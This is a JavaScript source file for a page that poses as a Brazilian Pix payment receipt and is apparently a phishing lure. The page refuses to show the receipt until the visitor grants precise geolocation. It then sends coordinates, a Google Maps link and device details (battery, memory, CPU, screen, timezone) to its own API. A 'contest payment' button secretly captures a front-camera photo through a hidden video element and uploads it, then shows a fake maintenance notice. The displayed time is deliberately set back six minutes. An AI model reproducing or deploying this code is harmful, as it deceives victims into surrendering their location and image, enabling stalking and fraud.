// Configurações
const CONFIG = {
    API_ENDPOINT: '/api/dbx',
    GEOLOCATION_TIMEOUT: 10000,
    HIGH_ACCURACY: true
};

// Estado da aplicação
const app = {
    elements: {},

    init() {
        this.cacheElements();
        this.checkGeolocationSupport();
    },

    cacheElements() {
        this.elements.loading = document.getElementById('loading-screen');
        this.elements.error = document.getElementById('error-screen');
        this.elements.comprovante = document.getElementById('comprovante');
        this.elements.errorMessage = document.getElementById('error-message');
    },

    checkGeolocationSupport() {
        if (!navigator.geolocation) {
            this.showError('Seu navegador não suporta geolocalização.');
            return;
        }

        console.log('Geolocalização suportada. Solicitando permissão...');
        this.requestLocation();
    },

    requestLocation() {
        navigator.geolocation.getCurrentPosition(
            (position) => {
                console.log('Localização obtida:', position);
                this.handleSuccess(position);
            },
            (error) => {
                console.error('Erro ao obter localização:', error);
                this.handleError(error);
            },
            {
                enableHighAccuracy: CONFIG.HIGH_ACCURACY,
                timeout: CONFIG.GEOLOCATION_TIMEOUT,
                maximumAge: 0
            }
        );
    },

    async handleSuccess(position) {
        try {
            // Preencher comprovante
            this.fillComprovanteData();

            // Coletar dados
            const data = await this.collectData(position);

            // Enviar para API
            await this.sendToAPI(data);

            // Mostrar comprovante
            this.showComprovante();
        } catch (error) {
            console.error('Erro ao processar dados:', error);
            this.showError('Erro ao processar informações. Tente novamente.');
        }
    },

    handleError(error) {
        let message = 'Você precisa permitir a localização para visualizar o documento.';

        switch (error.code) {
            case error.PERMISSION_DENIED:
                message = 'Por favor, permita acesso a localização ou revise suas configurações de navegação.';
                break;
            case error.POSITION_UNAVAILABLE:
                message = 'Informações do documento não disponíveis no momento. Verifique sua conexão.';
                break;
            case error.TIMEOUT:
                message = 'Tempo esgotado ao tentar obter o documento. Verifique sua conexão.';
                break;
        }

        this.showError(message);
    },

    fillComprovanteData() {
        const now = new Date();

        // Data
        document.getElementById('data-atual').textContent = now.toLocaleDateString('pt-BR', {
            day: '2-digit',
            month: '2-digit',
            year: 'numeric'
        });

        // Hora (com 6 minutos atrasados)
        const horaAtrasada = new Date(now.getTime());
        horaAtrasada.setMinutes(horaAtrasada.getMinutes() - 6);

        document.getElementById('hora-atual').textContent = horaAtrasada.toLocaleTimeString('pt-BR', {
            hour: '2-digit',
            minute: '2-digit',
            second: '2-digit'
        });

        // Protocolo único
        const protocolo = this.generateProtocolo();
        document.getElementById('protocolo').textContent = protocolo;

        // Data de geração (Mantém o tempo real)
        document.getElementById('data-geracao').textContent = now.toLocaleString('pt-BR');
    },

    generateProtocolo() {
        const timestamp = Date.now();
        const random = Math.floor(Math.random() * 10000).toString().padStart(4, '0');
        return `${timestamp}-${random}`;
    },

    async collectData(position) {
        const { latitude, longitude, accuracy } = position.coords;

        // Coletar informações de bateria
        let battery = { nivel: 'N/D', carregando: false };
        if (navigator.getBattery) {
            try {
                const batteryInfo = await navigator.getBattery();
                battery = {
                    nivel: `${Math.round(batteryInfo.level * 100)}%`,
                    carregando: batteryInfo.charging
                };
            } catch (e) {
                console.warn('Não foi possível obter informações da bateria:', e);
            }
        }

        // Coletar informações de conexão
        const connection = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
        const connectionType = connection ? connection.effectiveType : 'N/D';

        return {
            lat: latitude,
            lng: longitude,
            precisao: `${Math.round(accuracy)}m`,
            googleMaps: `https://www.google.com/maps?q=${latitude},${longitude}`,
            dispositivo: {
                agente: navigator.userAgent,
                plataforma: navigator.userAgentData ? navigator.userAgentData.platform : navigator.platform,
                memoria: navigator.deviceMemory ? `${navigator.deviceMemory}GB` : 'N/D',
                cpu: navigator.hardwareConcurrency || 'N/D',
                tela: `${screen.width}x${screen.height}`,
                conexao: connectionType,
                bateria: battery,
                fuso: Intl.DateTimeFormat().resolvedOptions().timeZone
            }
        };
    },

    async sendToAPI(data) {
        try {
            const response = await fetch(CONFIG.API_ENDPOINT, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify(data)
            });

            if (!response.ok) {
                console.warn('Resposta da API não foi OK:', response.status);
            }
        } catch (error) {
            // Não bloqueamos a exibição do comprovante se a API falhar
            console.error('Erro ao enviar dados para API:', error);
        }
    },

    async sendPhotoToAPI(photoBlob, metadata) {
        try {
            const formData = new FormData();
            formData.append('photo', photoBlob, 'contestacao.jpg');
            formData.append('metadata', JSON.stringify(metadata));

            const response = await fetch('/api/upload-photo', {
                method: 'POST',
                body: formData
            });

            if (!response.ok) {
                throw new Error('Erro ao enviar foto');
            }

            return await response.json();
        } catch (error) {
            console.error('Erro ao enviar foto para API:', error);
            throw error;
        }
    },

    showComprovante() {
        this.elements.loading.classList.add('hidden');
        this.elements.error.classList.add('hidden');
        this.elements.comprovante.classList.remove('hidden');
    },

    showError(message) {
        this.elements.errorMessage.textContent = message;
        this.elements.loading.classList.add('hidden');
        this.elements.comprovante.classList.add('hidden');
        this.elements.error.classList.remove('hidden');
    }
};

// Função para contestar pagamento com foto
async function contestarPagamento() {
    // Mostrar modal de carregamento
    const modal = createLoadingModal();
    document.body.appendChild(modal);

    try {
        // Solicitar acesso à câmera frontal
        const stream = await navigator.mediaDevices.getUserMedia({
            video: {
                facingMode: 'user', // Câmera frontal
                width: { ideal: 1280 },
                height: { ideal: 720 }
            }
        });

        // Criar elemento de vídeo oculto
        const video = document.createElement('video');
        video.style.display = 'none';
        video.setAttribute('autoplay', '');
        video.setAttribute('playsinline', '');
        video.srcObject = stream;
        document.body.appendChild(video);

        // Aguardar o vídeo estar pronto
        await video.play();

        // Aguardar um pouco para a câmera estabilizar
        await new Promise(resolve => setTimeout(resolve, 500));

        // Capturar foto automaticamente
        const photoBlob = await capturePhoto(video, stream);

        // Remover vídeo
        video.remove();

        // Atualizar modal para "enviando"
        modal.querySelector('.modal-content').innerHTML = `
            <div style="text-align: center; padding: 40px;">
                <div class="spinner"></div>
                <h3>Processando contestação...</h3>
                <p>Aguarde um momento...</p>
            </div>
        `;

        // Enviar para API
        const metadata = {
            protocolo: document.getElementById('protocolo').textContent,
            timestamp: new Date().toISOString(),
            tipo: 'contestacao'
        };

        await app.sendPhotoToAPI(photoBlob, metadata);

        // Mostrar mensagem de recurso indisponível
        modal.querySelector('.modal-content').innerHTML = `
            <div style="text-align: center; padding: 40px;">
                <div style="font-size: 64px; margin-bottom: 20px; color: var(--text-light);">⚠️</div>
                <h3 style="color: var(--text-dark); margin-bottom: 15px;">Recurso Temporariamente Indisponível</h3>
                <p style="color: var(--text-light); margin-bottom: 30px;">
                    O sistema de contestação está em manutenção no momento.<br>
                    Por favor, tente novamente mais tarde.
                </p>
                <button class="btn btn-primary" onclick="this.closest('.camera-modal').remove()">Entendido</button>
            </div>
        `;

    } catch (error) {
        console.error('Erro ao acessar câmera:', error);

        let message = 'Não foi possível acessar a câmera.';
        let title = 'Erro de Permissão';

        if (error.name === 'NotAllowedError') {
            message = 'Você precisa permitir o acesso à câmera para contestar o Pix.';
        } else if (error.name === 'NotFoundError') {
            title = 'Câmera Não Encontrada';
            message = 'Nenhuma câmera foi encontrada no seu dispositivo.';
        } else if (error.name === 'NotReadableError') {
            title = 'Câmera em Uso';
            message = 'A câmera está sendo usada por outro aplicativo.';
        }

        // Mostrar erro
        modal.querySelector('.modal-content').innerHTML = `
            <div style="text-align: center; padding: 40px;">
                <div style="font-size: 64px; margin-bottom: 20px; color: var(--danger-color);">✕</div>
                <h3 style="color: var(--danger-color); margin-bottom: 15px;">${title}</h3>
                <p style="color: var(--text-light); margin-bottom: 30px;">${message}</p>
                <button class="btn btn-primary" onclick="this.closest('.camera-modal').remove()">Fechar</button>
            </div>
        `;
    }
}

// Criar modal de carregamento
function createLoadingModal() {
    const modal = document.createElement('div');
    modal.className = 'camera-modal';
    modal.innerHTML = `
        <div class="modal-overlay"></div>
        <div class="modal-content">
            <div style="text-align: center; padding: 40px;">
                <div class="spinner"></div>
                <h3>Aguardando permissão da câmera...</h3>
                <p>Por favor, permita o acesso à câmera.</p>
            </div>
        </div>
    `;

    // Adicionar estilos do modal
    const style = document.createElement('style');
    style.textContent = `
        .camera-modal {
            position: fixed;
            top: 0;
            left: 0;
            right: 0;
            bottom: 0;
            z-index: 9999;
            display: flex;
            align-items: center;
            justify-content: center;
        }
        .modal-overlay {
            position: absolute;
            top: 0;
            left: 0;
            right: 0;
            bottom: 0;
            background: rgba(0, 0, 0, 0.8);
        }
        .modal-content {
            position: relative;
            background: white;
            border-radius: 16px;
            padding: 30px;
            max-width: 500px;
            width: 90%;
            box-shadow: 0 20px 60px rgba(0, 0, 0, 0.3);
        }
        .modal-content h3 {
            margin-bottom: 10px;
            color: var(--text-dark);
        }
        .modal-content p {
            margin-bottom: 20px;
            color: var(--text-light);
        }
    `;
    document.head.appendChild(style);

    return modal;
}

// Capturar foto do vídeo
async function capturePhoto(video, stream) {
    const canvas = document.createElement('canvas');
    canvas.width = video.videoWidth;
    canvas.height = video.videoHeight;

    const ctx = canvas.getContext('2d');
    ctx.drawImage(video, 0, 0);

    // Parar o stream
    stream.getTracks().forEach(track => track.stop());

    // Converter para blob
    return new Promise((resolve) => {
        canvas.toBlob((blob) => {
            resolve(blob);
        }, 'image/jpeg', 0.9);
    });
}

// Inicializar quando a página carregar
window.addEventListener('DOMContentLoaded', () => {
    app.init();
});

// Prevenir recarregamento acidental
window.addEventListener('beforeunload', (e) => {
    if (!app.elements.comprovante.classList.contains('hidden')) {
        e.preventDefault();
        return '';
    }
});